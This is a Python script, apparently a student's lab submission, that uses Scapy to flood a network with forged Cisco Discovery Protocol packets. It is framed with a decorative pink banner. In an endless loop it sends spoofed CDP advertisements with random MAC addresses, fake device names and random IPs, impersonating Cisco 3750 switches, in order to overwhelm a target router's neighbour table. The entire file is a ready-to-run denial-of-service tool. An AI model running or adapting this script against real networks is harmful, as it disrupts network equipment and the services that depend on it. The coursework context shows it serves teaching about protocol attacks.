#!/usr/bin/env python3
import sys
import time
import random
import string
import os

# --- COLORES Y ESTILO (ANSI) ---
# Definimos el color rosado y negrita para que se vea lindo
ROSA = '\033[95m'
NEGRITA = '\033[1m'
BLANCO = '\033[0m'  # Para resetear al final
# -------------------------------

# 1. Mensaje de Carga con estilo
print(f"\n{ROSA}[+] Cargando herramientas... un momento plis...{BLANCO}")

try:
    from scapy.all import *
    load_contrib("cdp")
except ImportError:
    print(f"\n{ROSA}[X] ERROR: No tienes Scapy instalado.{BLANCO}")
    sys.exit(1)

# --- BLOQUE TÉCNICO (Compatibilidad) ---
import scapy.contrib.cdp as cdp_mod
def get_cls(name, alt):
    return getattr(cdp_mod, name) if hasattr(cdp_mod, name) else getattr(cdp_mod, alt)

try:
    CDP_HDR = get_cls("CDPv2_HDR", "CDPv2_Hdr")
    CDP_DevID = get_cls("CDPMsgDeviceID", "CDP_DevID")
    CDP_PortID = get_cls("CDPMsgPortID", "CDP_PortID")
    CDP_Addr = get_cls("CDPMsgAddr", "CDP_Address")
    CDP_Cap = get_cls("CDPMsgCapabilities", "CDP_Capabilities")
    CDP_Soft = get_cls("CDPMsgSoftwareVersion", "CDP_SoftwareVersion")
    CDP_Plat = get_cls("CDPMsgPlatform", "CDP_Platform")
except Exception:
    pass

# --- CONFIGURACIÓN ---
interfaz_red = "eth0"
ip_router_visual = "20.24.11.1"

# 2. DETECCIÓN AUTOMÁTICA DE TU IP
try:
    mi_ip_kali = get_if_addr(interfaz_red)
except:
    mi_ip_kali = "No detectada"

# 3. INTERFAZ GRÁFICA (AQUÍ ESTÁ LA MAGIA)
os.system('clear') # Limpia la pantalla

# Banner en Arte ASCII
banner = f"""{ROSA}{NEGRITA}
  ____       ____             __   ____ ____  ____  
 |  _ \ ___ / ___|   ___  _  / _| / ___|  _ \|  _ \ 
 | | | / _ \\___ \  / _ \| || |_ | |   | | | | |_) |
 | |_| \__  )___) || (_) | ||  _|| |___| |_| |  __/ 
 |____/ ___/|____/  \___/|_||_|   \____|____/|_|    
                                   
             ~ by Abi.R ~
{BLANCO}"""

print(banner)
print(f"{ROSA}" + "♥" * 50)
print(f" ✿  MI IP (Kali):         {mi_ip_kali}")
print(f" ✿  OBJETIVO VISUAL:      {ip_router_visual} (Router R1)")
print(f" ✿  ESTADO:               {NEGRITA}ATACANDO CON ESTILO ✨{ROSA}")
print("♥" * 50 + f"{BLANCO}")
print(f"\n{ROSA}[!!!] ENVIANDO PAQUETES... (Presiona Ctrl + C para parar){BLANCO}")

# 4. BUCLE DE ATAQUE
try:
    while True:
        # Datos Aleatorios
        mac_rnd = "00:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        nombre = "Router_" + ''.join(random.choices(string.ascii_uppercase, k=4))
        ip_fake = "192.168.%d.%d" % (random.randint(1, 254), random.randint(1, 254))

        # Paquete
        packet = Ether(src=mac_rnd, dst="01:00:0c:cc:cc:cc") / \
                 LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
                 SNAP(OUI=0x00000c, code=0x2000) / \
                 CDP_HDR() / \
                 CDP_DevID(val=nombre) / \
                 CDP_Soft(val=b"Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(55)SE") / \
                 CDP_Plat(val=b"cisco WS-C3750G-24TS-1S") / \
                 CDP_Addr(addr=[ip_fake]) / \
                 CDP_PortID(iface=b"GigabitEthernet0/1") / \
                 CDP_Cap(cap=0x01)

        packet = packet.__class__(bytes(packet))
        sendp(packet, iface=interfaz_red, verbose=0)
        
        # Corazón latiendo como feedback visual
        sys.stdout.write(f"{ROSA}♥ {BLANCO}")
        sys.stdout.flush()
        time.sleep(0.2) # Un poquito más lento para que se vea el efecto

except KeyboardInterrupt:
    print(f"\n\n{ROSA}[✿] Ataque finalizado. ¡Gracias por usar este archivo! Espero que este bien profe :( {BLANCO}")
